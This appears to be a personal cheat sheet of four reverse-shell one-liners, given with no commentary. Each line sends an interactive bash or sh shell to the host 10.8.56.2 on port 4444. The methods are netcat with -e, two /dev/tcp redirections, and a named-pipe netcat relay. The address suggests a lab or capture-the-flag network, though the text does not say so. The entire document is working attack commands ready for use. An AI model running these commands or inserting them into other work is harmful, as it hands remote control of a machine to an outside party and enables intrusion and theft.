# 1
nc 10.8.56.2 4444 -e /bin/bash

# 2
/bin/bash -l > /dev/tcp/10.8.56.2/4444 0<&1 2>&1


# 3
bash -i >& /dev/tcp/10.8.56.2/4444 0>&1

#4
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.56.2 4444 > /tmp/f